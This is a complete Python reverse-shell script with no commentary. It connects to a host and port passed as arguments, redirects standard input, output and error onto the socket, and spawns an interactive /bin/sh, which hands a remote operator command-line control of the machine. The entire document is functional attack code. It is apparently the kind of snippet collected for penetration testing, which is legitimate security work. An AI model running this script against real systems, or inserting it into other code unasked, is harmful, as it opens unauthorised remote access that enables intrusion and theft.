#!/usr/bin/python

import socket,subprocess,os,sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((str(sys.argv[1]),int(sys.argv[2])))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
